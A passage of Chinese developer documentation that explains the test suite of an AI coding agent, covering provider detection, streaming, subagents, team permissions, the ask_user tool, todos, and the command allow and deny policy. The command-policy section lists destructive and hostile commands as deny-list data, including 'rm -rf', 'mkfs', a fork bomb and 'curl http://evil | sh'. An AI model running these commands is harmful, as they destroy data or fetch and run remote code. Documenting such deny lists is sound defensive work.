| `test_codeindex.py` | 128 | 9 | Chunker / Store / ServiceBuild | 分块、向量检索、增量构建 | 07 卷 |
| `test_mcp.py` | 189 | 14 | ConfigParsing / Helpers / StdioClient / Manager | MCP 配置两种形态、生命周期、失败禁用 | 07 卷 |
| `test_memory.py` | 127 | 11 | Store / Files / Tools | 记忆落库 + Markdown 镜像 | 07 卷 |
| `test_memory_pending.py` | 203 | 22 | Extraction / PendingStore / CaptureAndPromote | 自动抽取规则、去重、提升 | 07 卷 |
| `test_session_store.py` | 228 | 14 | Store / TranscriptCap / ManagerHistory | 落盘、240 条上限不切碎轮次、删除不回写 | 07 卷 |
| `test_session_search.py` | 120 | 9 | Search / IndexHooks | 中文子串可搜、只索引正文 | 07 卷 |
| `test_skills.py` | 132 | 12 | Frontmatter / Loader / Service | frontmatter 解析、项目级覆盖内置 | 07 卷 |
| `test_todos.py` | 147 | 11 | Normalize / Render / ToolHandler / Persistence | 清单持久化、重启不丢 | 06/07 卷 |
| `test_usage.py` | 98 | 6 | UsageLog | JSONL 追加、按日聚合、轮转归档 | 07 卷 |
| `test_usage_totals.py` | 66 | 3 | UsageTotals | 多轮 token 求和 | 07 卷 |
| `test_native.py` | 163 | 20 | Tokenizer / Codesoup / Compression / BackendParity / NativeInfo | 原生后端与纯 Python 回退行为一致 | 03/05 卷 |
| `test_version.py` | 27 | 3 | VersionTest | 版本号单一来源 | 03 卷 |
| `fake_mcp_server.py` | 71 | — | — | 测试用 stdio MCP 服务器（不是测试） | 07 卷 |

合计 26 个测试文件 + 1 个辅助脚本 = 4,112 行、298 个 `def test_`。

### 11.3 LLM 层：五个文件守着五道门

#### 11.3.1 `test_llm_providers.py`（329 行 / 18 个）

六个 class，前四个很短，后两个最长：

| class | 行 | 测什么 |
|---|---:|---|
| `TestProviderDetection` | 46 | `detect_provider`：**端点形状优先于类型** |
| `TestChatUrls` | 76 | `resolve_chat_url`：Ollama / OpenAI 各自的拼装 |
| `TestToolUnsupportedDetection` | 92 | 从错误文本识别「该端点不支持函数调用」 |
| `TestOpenAIToolsFallback` | 106 | OpenAI 壳的降级 + 告警去重 + TTL |
| `TestOllamaToolsFallback` | 230 | Ollama 壳的降级 |
| `TestReasoningStream` | 268 | 思考字段优先转发，且不混进正文 |

**检测类（五个用例）**：

```python
46  class TestProviderDetection(unittest.TestCase):
    def test_openai_endpoint_wins_over_ollama_type(self): ...
    def test_ollama_endpoint_wins_over_openai_type(self): ...
    def test_v1_suffix_is_openai(self): ...
    def test_root_url_keeps_configured_type(self): ...
    def test_build_provider_follows_detection(self): ...
```

这五条把 `detect_provider` 的优先级钉死了：

| 输入 | 结果 | 为什么 |
|---|---|---|
| 类型 `ollama` + 端点 `.../v1/chat/completions` | `openai_compat` | 网关伪装成 Ollama，实际要 Bearer |
| 类型 `openai_compat` + 端点 `.../api/chat` | `ollama` | 反过来同样成立 |
| 端点以 `/v1` 结尾 | `openai_compat` | 兜底规则 |
| 端点无特征（如 `http://localhost:11434`） | 用**配置的类型** | 只在这种时候类型才有意义 |
| 任意组合 | `build_provider` 给出的实例与 `detect_provider` 的结论一致 | 检测不是纸上规则，构造必须跟着走 |

📌 **`test_build_provider_follows_detection` 是「规则与实现不脱节」的锁**：前三、四条测的是判定表，它测的是「判定结果真的被用来建 provider」——否则可以检测对了而构造函数仍然走老分支。

📌 **这就是 §5 里 `detectProvider` 必须与 Core 逐条对齐的原因**：如果两端判定不一致，壳会带着 API Key 发请求到 Ollama，或者不带 Key 发到 OpenAI 网关——直接 401。

**降级类（最值得看）**：

```python
164      self.assertNotIn("tools", sent[0])      # 第二次请求不再带 tools
165      self.assertIsNotNone(provider.consume_notice())   # 冒一次告警
```

四个断言层层递进：

| 测试 | 断言 | 含义 |
|---|---|---|
| `test_retries_without_tools_and_reports_once` | `len(sent)==2`、`"tools" not in sent[1]`、notice 非空 | 400「does not support tools」→ **自动重试一次不带工具** |
| `test_known_endpoint_skips_tools_on_next_task` | 下一次 `chat_stream` 直接不带 tools | 记住这个端点 |
| `test_probation_expires_...` | 手动把时间戳推到 `now - 1.0` → 下一次**又带** tools | 记忆有 TTL，不是永久的 |
| `test_notice_is_shown_once_per_endpoint_across_tasks` | 两个新 provider 实例，只有第一个 `consume_notice()` 非空 | 告警去重在**模块级**（`_notice_shown`） |

📌 **为什么去重必须放模块级**：注释写得很清楚（L195-197）——「每个任务都会新建 provider」。把标志放实例里，用户每发一条消息都会再收到一次「你的模型不支持函数调用」的告警。

📌 **`test_probation_expires...` 的故事**（L168-170）：运维给 vLLM 加了 `--enable-auto-tool-choice`，如果 TTL 是永久的，用户必须重启 IDE 才能重新用工具。所以 probation 是**时间戳 + 过期**，`_tools_suppressed[key] = time.monotonic() - 1.0` 就是在模拟「一秒前刚刚过期」。

#### 11.3.2 `test_transport_errors.py`（195 行 / 12 个）

```python
32  class TestDescribeTransportError(unittest.TestCase):
      def test_read_timeout_names_the_phase_and_the_endpoint(self)
      def test_connect_timeout_points_at_the_connect_phase(self)
      def test_dropped_stream_is_not_blank(self)
      def test_connect_error_talks_about_the_endpoint(self)
      def test_unknown_transport_error_still_has_text(self)
70  class TestProvidersSurfaceTransportErrors(unittest.TestCase):
      def test_openai_provider_never_reports_an_empty_message
      def test_ollama_provider_never_reports_an_empty_message
100 class TestRetries(unittest.TestCase):
      def test_transient_503_is_retried_before_any_token
      def test_exhausted_retries_are_named_in_the_error
      def test_started_output_disables_retries
      def test_auth_failure_is_not_replayed
      def test_empty_exception_falls_back_to_the_class_name
185 class TestServerErrorText(unittest.TestCase):
```

这一组守的是一条很容易被忽视的产品线：**错误消息要让用户能自己动手**。

| 测试 | 锁住的行为 |
|---|---|
| read timeout 提及阶段与端点 | 用户知道是「读超时」而不是「网络不通」，并且知道打的是哪个 URL |
| connect timeout 指向 connect 阶段 | 区分「连不上」与「连上了但不回」 |
| dropped stream 不为空 | 流断在半路时不能报一个空字符串 |
| 两个 provider 都不报空消息 | 兜底：无论底层异常多奇怪，最终都有一句话 |
| 503 重试发生在任何 token 之前 | **一旦已经开始吐字，就不能重试**，否则前端会收到重复文本 |
| started output 禁用重试 | 同上，用状态机而不是靠调用方小心 |
| auth 失败不重放 | 401 重试只会加重风控 |
| 空异常回退到类名 | `except Exception as e` 里 `str(e)` 可能是 `""` |

📌 **`test_started_output_disables_retries` 与 `test_transient_503_is_retried_before_any_token` 是一对**：它们共同定义了「什么时候可以重试」——**只要已经向壳发过一个 token，就不能重试**。因为壳已经把字打到面板上了，重试会导致内容重复。

#### 11.3.3 `test_streaming.py`（117 行 / 11 个）

```python
18  class TestParseSseLine(unittest.TestCase):
      def test_data_line / test_non_data_line
27  class TestOpenAIAccumulator(unittest.TestCase):
      def test_text_tokens
      def test_tool_call_fragments_across_chunks     # 一个工具调用被切成多个 delta
      def test_parallel_tool_calls_two_slots        # index=0 / index=1 两个并行调用
      def test_invalid_arguments_kept_raw           # JSON 不完整也不丢
      def test_reasoning_content_stays_out_of_content  # 思考字段不进正文
81  class TestOllamaAccumulator(unittest.TestCase):
      def test_text_and_usage
      def test_whole_tool_calls_deduplicated        # 整块返回时不重复收集
      def test_arguments_as_json_string
      def test_thinking_field_is_separate_from_content
```

三个最关键的：

1. **`test_tool_call_fragments_across_chunks`**：OpenAI 的流式工具调用形状是
   ```
   delta.tool_calls[0] = {index:0, id:"call_1", function:{name:"read_file", arguments:""}}
   delta.tool_calls[0] = {index:0, function:{arguments:"{\"pa"}}
   delta.tool_calls[0] = {index:0, function:{arguments:"th\":\"a.txt\"}"}}
   ```
   `id`/`name` 只出现一次，`arguments` 分片到达 → 累加器必须**按 index 归并**，不能每个 delta 新建一个调用。

2. **`test_parallel_tool_calls_two_slots`**：模型可以一次返回两个工具调用（`index:0` 和 `index:1`），累加器要有**两个槽**。这也是 Core 能并行执行工具的前提（04 卷）。

3. **`test_invalid_arguments_kept_raw`**：模型偶尔吐出非法 JSON（多一个引号、少一个括号）。此时**不能丢弃整个调用**——保留原始字符串，让 `tool_text` 或调度器报告「参数解析失败」，模型才有机会自己修。

4. **`test_reasoning_content_stays_out_of_content` / `test_thinking_field_is_separate_from_content`**：两家推理端点把思考放在不同字段（OpenAI 形状是 `reasoning_content`，Ollama 形状是 `thinking`），累加器必须把它**单独收集**，绝不能拼进 `content`。拼进去的后果是：思考被当成回答写进会话历史、下一轮又被当作上下文发回去，token 双倍计费且模型会「复读」自己的草稿。

📌 **`test_whole_tool_calls_deduplicated`**：某些兼容端点会既给分片又给完整块（或重复发送），累加器必须去重，否则同一个 `toolCallId` 会出现两次 → 壳执行两次工具。

#### 11.3.4 `test_tool_text.py`（149 行 / 10 个）

```python
43  class TestTextToolCallFilter(unittest.TestCase):
      def test_markup_split_across_chunks_is_hidden   # <tool_call> 跨 chunk 也要藏住
      def test_plain_text_is_untouched
      def test_bare_function_block_is_hidden
      def test_unterminated_block_is_dropped          # 没有闭合就丢掉
      def test_hermes_xml                            # <tool_call>...</tool_call>
      def test_json_block
      def test_write_file_content_keeps_inner_newlines # 参数里的换行不被吞
67  class TestRecoverTextToolCalls(unittest.TestCase):
      def test_bare_function_block_is_recovered
      def test_plain_text_is_returned_untouched
104 class TestProviderRecoversTextCall(unittest.TestCase):
      def test_stream_converts_markup_into_tool_call
```

这是 05 卷里最不起眼、但**用户能直接看到**的一层：小模型不会用 `tool_calls` 字段，而是把调用写成文本：

```
<tool_call>{"name": "read_file", "arguments": {"path": "a.txt"}}</tool_call>
```

需要同时满足两件事：

| 目标 | 手段 | 测试 |
|---|---|---|
| 用户**不该看到**这段标记 | 过滤器在流式输出里把标记区段吞掉 | `test_markup_split_across_chunks_is_hidden` |
| Core **要把它变成真调用** | 回收器解析出 `ToolCall` | `test_stream_converts_markup_into_tool_call` |

📌 **`test_markup_split_across_chunks_is_hidden` 是最难的一条**：`<tool_call>` 可能被切成 `"<tool_"` + `"call>"` 两个 token 到达。过滤器不能只看单个 chunk，必须维护「缓冲区里有没有未闭合的标记」的状态机。

📌 **`test_unterminated_block_is_dropped`**：模型写了 `<tool_call>` 但忘了闭合。此时既不显示（否则用户看到一堆 JSON），也不回收（解析器会吃掉后面所有正文）。

#### 11.3.5 `test_completion.py`（59 行 / 7 个）

```python
16  class TestCompletionUrls(unittest.TestCase):
      def test_ollama_generate_url_from_chat_endpoint   # .../api/chat → .../api/generate
      def test_openai_completions_url                   # .../chat/completions → .../completions
34  class TestSanitize(unittest.TestCase):
      def test_strips_markdown_fence
      def test_cuts_repeated_suffix_line
      def test_drops_prefix_echo
      def test_keeps_plain_completion
      def test_empty_text
```

这 7 个测试正是 §9.16 那张 `sanitize()` 表的可执行版：

| 测试 | 对应 `completion.py` 的行 |
|---|---|
| `test_strips_markdown_fence` | 123、145-148：丢掉 ` ``` ` 开头的行 |
| `test_cuts_repeated_suffix_line` | 125-132：补全里出现后文 → 在那里截断 |
| `test_drops_prefix_echo` | 137-139：补全复读上文尾行 → 切掉 |
| `test_keeps_plain_completion` | 干净的补全不能被误伤 |
| `test_empty_text` | 142：空白返回 `""` |

📌 **`test_keeps_plain_completion` 是「防过度清洗」的哨兵**：`sanitize` 有五道裁剪，每加一道都可能误杀正常补全。

---

### 11.4 Agent 层：循环、调度、子代理、团队、提问

#### 11.4.1 `test_scheduler.py`（91 行 / 4 个）

```python
20  class TestScheduler(unittest.IsolatedAsyncioTestCase):
      async def test_runs_tools_in_parallel
      async def test_unknown_tool_returns_error
      async def test_timeout_is_isolated
      async def test_start_and_end_callbacks
```

| 测试 | 关键断言 | 锁住的行为 |
|---|---|---|
| `runs_tools_in_parallel` | 4 个各睡 0.1s 的工具，总耗时 **< 0.35s** | 真的并行，不是伪并行 |
| `timeout_is_isolated` | slow(0.1s 超时) 失败，fast(5s) 成功 | **一个超时不拖累其它** |
| `unknown_tool_returns_error` | `results[0].error` 含「未知工具」 | 未知工具返回失败结果而非抛异常 |
| `start_and_end_callbacks` | 事件序列 `[("start","c1"),("end","c1",True)]` | 回调严格先 start 后 end |

📌 **`< 0.35s` 这个阈值卡得很紧**：4 × 0.1s 串行是 0.4s，并行是 0.1s。0.35s 既能容忍 CI 抖动，又能抳住任何把它改成串行的回归。

⚠️ **`test_timeout_is_isolated` 只能证明「调度器给每个工具单独计时」**，不能证明「超时后工具真的停了」——`asyncio.wait_for` 取消的是协程，不取消底层进程/线程。§8.14 那个「不杀孙进程」的洞在 Python 侧同样存在（如果工具是阻塞调用）。

#### 11.4.2 `test_status.py`（151 行 / 8 个）

这个文件讲的是一个**产品细节**：为什么模型在長任务里不跑偏。答案是：每轮往请求末尾追加一段 `<agent_status>`。

**第一部分：`TurnStats` 的渲染（6 个）**

```python
30  def test_idle_turn_has_no_block          # 什么都没发生 → 空字符串
35  def test_counts_tools_and_flags_repeats # "轮次: 2/10"、"read_file 2"、"重复: read_file(a.py) ×2"
48  def test_repeats_are_found_even_when_one_off_calls_dominate
60  def test_repeat_list_is_capped_at_three  # 5 个重复项只报 3 条
69  def test_failure_keeps_clipped_error     # "失败: read_file ×1" + 截断的错
79  def test_edited_files_are_deduped_in_order # "已改: A.java、B.java"（A 只出现 1 次）
```

| 行 | 来源 |
|---|---|
| 42 | `轮次: 2/10`（当前轮 / 预算） |
| 43 | `read_file 2`（每个工具调了几次） |
| 44 | `重复: read_file(a.py) ×2`（**同参数**重复才计） |
| 67 | 重复列表最多 3 条（`text.count("×2") == 3`） |
| 75 | `失败: read_file ×1` |
| 77 | 整个块 < 400 字符（错误信息被截断） |
| 87 | `已改: A.java、B.java`——同一文件改两次只列一次 |

📌 **「重复」的定义是「工具名 + 参数」**（44 行 `read_file(a.py)`）：同一个文件读两次算重复，读 `a.py` 再读 `b.py` 不算。这是最有效的「模型在绕圈」信号。

📌 **第 48 行那个用例特别妙**：4 次不同文件的调用（a/b/c/d）看着像在干活，然后 z.py 连读两次——重复项必须从「噪音里」被找出来，而不是只看出现次数最多的。

**第二部分：注入位置（2 个）**

```python
129  def test_status_appears_only_on_later_rounds
132      self.assertNotIn("agent_status", first[-1].content or "")
133      second = provider.calls[1]
134      self.assertEqual(second[-1].role, Role.USER)
135      self.assertIn("<agent_status>", second[-1].content)
139  def test_system_prefix_is_stable_and_history_stays_clean
143      self.assertEqual(first_system, second_system)   # system 提示両轮完全一致
146      self.assertFalse(any("agent_status" in (m.content or "") for m in session.messages))
```

两个反直觉但有道理的决定：

1. **状态块附在最后一条 user 消息上**（134 行），不是新起一条 system 消息。因为很多推理端点不接受中间夹 system；而 user 消息的位置是稳定的。
2. **system 提示不因状态而变**（143 行）——否则每轮的 prompt 前缀都不一样，KV cache 全部失效，推理成本暴涨。

📌 **`test_system_prefix_is_stable_and_history_stays_clean` 是 04 卷里那句「状态是 per-request 的」的证据**：它只活在当次请求的 messages 副本里，`session.messages` 里一个字都没有（146 行）。所以下次打开历史会话，看不到任何 `<agent_status>` 垃圾。

#### 11.4.3 `test_unknown_tool.py`（96 行 / 4 个）

文件头注释直接描述了用户痛点（L1-6）：

> A bare `未知工具: bash` gives the model nothing to correct against, so it keeps inventing names (bash / Grep / Read) and prints "let me use the right tool name" until the iteration budget is gone.

两个守卫：

```python
34  class TestUnknownToolError(unittest.TestCase):
36      def test_error_lists_the_tools_that_do_exist
        # assertIn("未知工具: bash"), assertIn("read_file"), assertIn("search_code")
42      def test_scheduler_returns_the_same_hint
        # 调度器直接调 unknown_tool_error()，两处文案一定一致
64  class TestUnknownToolFuse(unittest.TestCase):
79      def test_turn_stops_after_repeated_unknown_tool
81          self.assertEqual(provider.rounds, UNKNOWN_TOOL_LIMIT)
82          self.assertIn("不存在的工具", result.content)
85      def test_each_failure_carries_the_available_names
88          self.assertEqual(len(tool_messages), UNKNOWN_TOOL_LIMIT)
```

| 阶段 | 行为 |
|---|---|
| 第 1 次错 | 返回 `未知工具: bash\n可用工具: read_file, search_code, ...` |
| 第 2..N-1 次错 | 同上（每次都带完整名单，因为模型未必记得上一轮） |
| 第 N 次错 | **提前结束回合**，最终回复写明「不存在的工具」 |

📌 **为什么两处都调 `unknown_tool_error()`**（`test_scheduler_returns_the_same_hint`）：调度器和循环各有一条报错路径。若文案分叉，模型会在两条路径上得到不同提示，行为不可预测。测试强制它们共用同一个函数。

📌 **「清单器」比「报错」重要**：模型不知道正确的名字时，唯一能自救的信息就是名单。这也是为什么 `ToolDef.description` 要写得像文档（模型先看名单再选）。

#### 11.4.4 `test_subagent.py`（364 行 / 21 个）

最大的一个测试文件。四个 class 对应子代理的四层：

| class | 行 | 锁住什么 |
|---|---:|---|
| `TestLoader` | 68 | 定义文件解析、内置与项目级优先级 |
| `TestPool` | 134 | 并行执行与排队 |
| `TestService` | 183 | 派发、白名单、超时、角色覆盖 |
| `TestCatalogInjection` | 331 | 目录写进 system prompt |

**定义加载**

| 测试 | 断言 |
|---|---|
| `parse_definition` | `SUBAGENT.md` 的 frontmatter + 正文 → 一个定义对象 |
| `parse_role_metadata` | `model` / `max_iterations` 等可选字段 |
| `unknown_output_and_zero_timeout_fall_back` | 非法 `output` 用默认；`timeout: 0` 不是「立即超时」而是「用默认」 |
| `builtin_definitions_are_loaded` | 包内置的 `subagents_builtin/*` 能被读出来 |
| `project_definition_overrides_builtin` | 项目 `.agent/subagents/x/SUBAGENT.md` 覆盖同名内置 |
| `rebinding_project_root_rescans` | 换了项目根要重新扫（不能缓存旧项目的定义） |

**并行池**

| 测试 | 断言 |
|---|---|
| `parallel_dispatch_and_queueing` | 并发上限内并行，超出排队 |
| `runner_failure_becomes_ugly_report` | 子代理崩了 → 返回一份「难看的」失败报告，而不是抛异常 |
| `events_are_emitted` | 开始/结束事件都要发到壳 |

**服务层（最关键）**

| 测试 | 锁住的行为 |
|---|---|
| `filtered_registry_drops_recursion_and_foreign_tools` | **子代理不能再派子代理**，也不能用它白名单外的工具 |
| `dispatch_uses_definition_prompt_and_tool_whitelist` | 派发时用定义里的 prompt 与白名单 |
| `dispatch_unknown_type_falls_back_to_default_tools` | 写错的类型名不报错，用默认工具集 |
| `dispatch_requires_goals` | 不给目标直接拒 |
| `dispatch_mixed_roles_in_one_call` | 一次派发可包含多个角色 |
| `dispatch_strips_write_tools_from_override` | **调用方不能靠 override 给子代理加写工具** |
| `role_model_and_iterations_override` | 角色可以指定自己的模型与轮次上限 |
| `timeout_becomes_failed_report` | 超时也是一份报告，不是异常 |

📌 **`filtered_registry_drops_recursion_and_foreign_tools` 是整个文件的核心**：子代理拿到的 `ToolRegistry` 是**重新构造的**，只包含白名单内的工具，而且一定不含 `dispatch_subagent` 本身。否则一个子代理可以无限套娃，把 token 预算烧光。

📌 **`dispatch_strips_write_tools_from_override`** 是另一道防线：就算调用方在参数里写了 `tools: ["write_file"]`，服务层也要把它删掉。因为子代理是并行跑的，两个子代理同时改同一个文件没有人拦（§10.6 的写锁只保护**主会话之间**）。

📌 **`timeout_becomes_failed_report` 与 `runner_failure_becomes_ugly_report` 同构**：子代理的任何失败都不能往上抛异常，否则整个主回合会死。降级成「一份说明自己失败了的文本」，主代理才有机会重试或换做法。

**目录注入**

| 测试 | 断言 |
|---|---|
| `catalog_lists_roles_and_policy` | 目录包含角色名与策略说明 |
| `list_handler` | `subagents` 工具能直接列出 |
| `catalog_is_appended_to_system_prompt` | 目录被追加到 system prompt 末尾 |
| `without_catalog_prompt_is_unchanged` | 没有子代理时 system prompt **一个字符都不变** |

📌 **最后一条又是在保护 KV cache**：没有子代理的项目，system prompt 必须和以前一模一样，否则老用户的缓存全部失效。

#### 11.4.5 `test_ask.py`（174 行 / 17 个）

`ask_user` 是唯一「Core 主动向壳要答案」的工具，也是最容易把回合卡死的一个。四个 class：

| class | 行 | 测试 | 锁住什么 |
|---|---:|---:|---|
| `TestNormalize` | 33 | 8 | 提问数据结构归一化 |
| `TestRender` | 70 | 4 | 答案渲染成文本 |
| `TestHandler` | 95 | 4 | 无 UI / 壳崩了怎么办 |
| `TestInteractiveScheduling` | 140 | 1 | 提问独占一个轮次 |

**Normalize（8 个）**

| 测试 | 例子 |
|---|---|
| `single_dict_is_wrapped` | 传一个对象 → 自动包成数组 |
| `questions_are_capped` | 最多 N 个问题 |
| `options_are_capped` | 每题最多 N 个选项 |
| `string_options_and_missing_description` | `"A"` → `{label:"A"}` |
| `question_without_text_is_dropped` | 没题干的问题直接丢 |
| `free_form_question_keeps_empty_options` | 开放题允许空选项（不能当错误） |
| `allow_custom_can_be_turned_off` | `allowCustom: false` 保留 |
| `garbage_input` | 传 `None` / 字符串 / 数字 → 得到空提问列表而不是抛异常 |

**Render（4 个）**

| 测试 | 断言 |
|---|---|
| `picks_and_custom_answer` | 选中项 + 自定义输入都要出现在结果里 |
| `multi_select_joins_labels` | 多选用、连接（模型能看懂） |
| `missing_answer_marks_unchosen` | 没回答的题显式标「未选」 |
| `skipped_tells_model_to_assume` | 用户跳过 → 告诉模型「按默认假设继续」 |

📌 **`skipped_tells_model_to_assume` 是防死循环的关键**：如果「跳过」渲染成空字符串，模型会认为「用户没回答，再问一次」。必须显式告诉它“用户跳过了，请自行假设”。

**Handler（4 个，全部 async）**

| 测试 | 场景 |
|---|---|
| `answers_are_rendered_into_the_tool_result` | 正常回路 |
| `empty_questions_is_an_error` | 一个问题都没有 → 工具失败（而不是发一个空通知） |
| `no_ui_degrades_to_assumptions` | 壳没声明 `ask-user` → 降级为「请自行假设」 |
| `broken_shell_does_not_kill_turn` | 壳超时/断开 → 回合继续 |

📌 **`no_ui_degrades_to_assumptions` 是 §10.7 的兜底路径**：壳不声明 `ask-user` 时，Core 把 `ask_user` 降级成「请自行假设」。⚠️ 但 3.3.0 的 VS Code 壳**声明了** `ask-user`（`session.ts:107-111`）却没有 `ask/user` 分支——它不会走这条优雅降级，而是由 `broken_shell_does_not_kill_turn` 兜住：空等 1800 s 后按「壳没回答」继续。前者是设计好的降级，后者是能力声明与实现不匹配造成的浪费。

**InteractiveScheduling（1 个）**

| 测试 | 断言 |
|---|---|
| `ask_user_runs_alone_before_the_rest` | 同一轮里多个调用包含 `ask_user` 时，它必须先单独执行，其它工具在它之后 |

📌 **为什么不能并行**：如果同一轮里既有 `ask_user` 又有 `write_file`，而用户对提问选择了「不要改这个文件」，写操作却已经执行了——这个时序无法回退。所以 `ask_user` 被单独串行执行，结果出来再决定后续。

#### 11.4.6 `test_team.py`（374 行 / 28 个）

团队编排是 3.3.0 最大的一块新增：一个 `FakeProvider` 替身 + 七个可执行 class。

| class | 行 | 测试 | 锁住什么 |
|---|---:|---:|---|
| `TestParsing` | 73 | 3 | 剧本文件的 frontmatter 与成员表解析 |
| `TestCapabilityMatrix` | 98 | 5 | 能力档到工具集的裁剪表 |
| `TestLoader` | 132 | 3 | 内置软件团队、项目级覆盖、换根重扫 |
| `TestServicePrompt` | 210 | 4 | 成员 system prompt、名册与当前团队标记 |
| `TestDispatch` | 238 | 6 | 派发、成员上限、轮次上限 |
| `TestPreapprove` | 301 | 4 | 预审豁免的范围与撤销 |
| `TestBlackboardTools` | 339 | 3 | 黑板读写与会话绑定 |

**能力档（先看这张表）**

| 测试 | 断言 |
|---|---|
| `readonly_strips_write_and_command` | 只读档拿不到 `write_file` / `run_command` |
| `write_grants_file_edits_but_not_terminal` | 写档可以改文件，但仍然不能开终端 |
| `command_grants_terminal_but_never_deletion` | 命令档能跑命令，`delete_file` 三档都不给 |
| `unknown_capability_behaves_like_readonly` | 写错档位名 → 按最保守的只读处理 |
| `d1_guardrail_keeps_plain_dispatch_read_only` | 没有团队的普通派发仍然是只读（04 卷 §9.2 的 D1 约定） |

📌 **`unknown_capability_behaves_like_readonly` 是安全默认值**：能力档来自项目里的 Markdown 名册，写错一个词（`read-write`、`Write`）时，正确的反应是**收回权限**而不是放宽——报错会让人以为功能坏了，降级只让人以为成员「不能改文件」。

**派发与上限**

| 测试 | 锁住什么 |
|---|---|
| `unknown_member_is_reported_not_dispatched` | 不存在的成员 → 报错，不静默换人 |
| `missing_role_definition_is_reported` | 名册里有、目录里没有 → 明确报错 |
| `capability_tools_reach_each_member` | 每个成员拿到的工具集按自己的档位裁剪 |
| `member_limit_is_enforced` | 单次派发的成员数有上限 |
| `disabled_team_refuses_dispatch` | 未启用团队时直接拒绝派发 |
| `turn_cap_bounds_the_whole_run` | 轮次上限约束**整条团队链**，不按成员各算一份 |

📌 **`turn_cap_bounds_the_whole_run` 是多代理系统最容易漏的一道闸**：五个成员各跑各的 40 轮，一次任务可以烧掉 200 轮。上限必须挂在「这次团队运行」上，而不是每个成员实例上。

**预审的边界**

| 测试 | 锁住什么 |
|---|---|
| `phase_scope_auto_write_after_approval` | 预审通过后，本阶段的写操作不再逐次弹卡 |
| `file_list_limits_the_grant` | 预审只带了文件清单 → 豁免范围就只到这些文件 |
| `rejection_keeps_per_edit_confirmation` | 用户拒绝预审 → 回到逐次 diff 确认 |
| `switch_off_disables_auto_write` | 中途关掉团队 → 豁免立即失效 |

📌 **`file_list_limits_the_grant` 是安全边界**：预审卡上写的是「计划改 A/B 两个文件」，那么 C 文件仍然要单独确认。「本次都别问我」不是默认语义，而是**声明了多少就豁免多少**。

#### 11.4.7 `test_blackboard.py`（111 行 / 8 个）

黑板是团队的共享交付物表（`agent/blackboard.py`，126 行），两个 class：

| class | 行 | 测试 | 锁住什么 |
|---|---:|---:|---|
| `TestArtifacts` | 24 | 6 | 交付物字段归一化、容量、筛选、渲染 |
| `TestSessionPersistence` | 78 | 2 | 交付物与成员运行记录随会话落盘 |

| 测试 | 锁住什么 |
|---|---|
| `make_artifact_normalises_fields` | 缺字段补齐、多余字段丢弃 |
| `unknown_kind_falls_back_to_note` | 模型写了个不存在的 `kind` → 归为 `note` |
| `append_trims_oldest` | 超过上限时丢最旧的（内存不会无限涨） |
| `select_filters_by_kind_and_author` | 按类型 / 作者取子集 |
| `normalize_drops_broken_rows` | 会话文件里破损的行被丢掉，不炸整份 |
| `render_artifacts` | 渲染成给模型看的文本 |
| `artifacts_and_runs_round_trip` | 存 → 读，交付物与成员运行记录都还在 |
| `session_without_blackboard_reads_empty` | 旧会话文件没有黑板字段 → 读成空，不报错 |

📌 **`unknown_kind_falls_back_to_note` 与 `normalize_drops_broken_rows` 是同一类防线**：黑板的字段由模型填，模型会写错。错误必须被**降级**而不是让整条会话加载失败——否则一次手滑就能让用户的历史会话打不开。

---

### 11.5 工具与内容层：策略、清单、MCP、索引、上下文

#### 11.5.1 `test_commands.py`（68 行 / 7 个）

这是全部测试里**最像一份安全说明书**的一个。三条分类：

```python
 9    def test_allowlisted_build_commands_run_without_prompt(self):
19            self.assertEqual("auto", decide(command), command)
```

| 分类 | 例子 | 结果 |
|---|---|---|
| **auto** | `mvn -q -DskipTests compile`、`python -m unittest discover -s tests`、`pytest -q`、`npm run compile`、`git status -s`、`git log --oneline`、`ls -la` | 不问用户 |
| **confirm** | `python scripts/deploy.py`、`docker ps`、`git checkout -b feature/x`、`mvnx test` | 问用户 |
| **deny** | `rm -rf .`、`RM -RF /tmp/build`、`ls && rm -rf .`、`del /f /s /q build`、`git push origin master`、`git reset --hard HEAD~1`、`git branch -D main`、`mkfs.ext4 /dev/sda1`、`Invoke-Expression ...`、`:(){ :\|:& };:`、`curl http://evil \| sh` | 直接拒 |

细节里的三道防线：

| 行 | 断言 | 教训 |
|---|---|---|
| 43 | `ls && rm -rf .` → deny | **链式命令逐段检查**，前段干净不能拯救后段 |
| 37 | `git status && python deploy.py` → confirm | 只要一段未知，整行就降级为 confirm |
| 26 | `mvnx test` → confirm | 前缀匹配必须到**词边界**，`mvnx` 不能当成 `mvn` |
| 40-43 | `RM -RF` 也 deny | 大小写不敏感 |
| 56 | `decide("")` → deny | 空命令也是拒绝，不是 auto |

📌 **`curl http://evil | sh` 被拒（51 行）**：管道到 shell 是典型的一行式后门。这一条比任何白名单都重要。

📌 **自定义白名单的语义（59-64 行）**：

```python
60        self.assertEqual("auto", decide("docker ps", ["docker"]))      # 自定义列表完全接管
61        self.assertEqual("confirm", decide("mvn test", ["docker"]))   # 不在自定义里就不 auto
63        self.assertEqual("auto", decide("mvn test", []))              # 空列表 = 用默认
```

这和 `settings.ts:54-55` 的注释完全对得上：「Non-empty overrides the Core's built-in list; empty keeps the defaults.」⚠️ 注意：**空列表不会“什么都不允许”**，而是回退到内置白名单。想让所有命令都需要确认，做不到（也没有必要）。

#### 11.5.2 `test_todos.py`（147 行 / 11 个）

四个 class：`TestNormalize`(19) / `TestRender`(45) / `TestToolHandler`(61) / `TestPersistence`(102)。

| 组 | 测试 | 锁住什么 |
|---|---|---|
| 归一化 | `valid_list_keeps_order_and_ids` | 模型给什么顺序就保持什么顺序 |
| 归一化 | `bad_entries_are_dropped_or_downgraded` | 缺字段的条目降级（而不是整个清单作废） |
| 归一化 | `non_list_payload_is_empty` | 传对象/字符串 → 空清单 |
| 渲染 | `render_counts_progress` | 文本版带进度（给模型看的） |
| 渲染 | `render_empty` | 空清单渲染成空串 |
| 工具 | `handler_writes_session_and_publishes` | 写 session + 发 `chat/todos` 通知 |
| 工具 | `empty_list_is_rejected` | 模型传 `[]` 改清单被拒（防止“误清空”） |
| 工具 | `without_a_bound_session_the_tool_refuses` | 没绑定会话就不干活 |
| 持久化 | `todos_survive_a_restart` | 重启 Core 后清单还在 |
| 持久化 | `old_file_without_todos_reads_as_empty` | 旧版会话文件（无 `todos` 字段）读取不报错 |
| 持久化 | `detail_exposes_todos_to_the_shell` | `session/get` 要带 `todos`，壳才能重建面板 |

📌 **`empty_list_is_rejected` 反直觉但重要**：模型想取消全部任务时，应该用显式状态（`cancelled`）而不是把清单删掉。删掉之后用户看不到「为什么没做」，也没有审计痕迹。

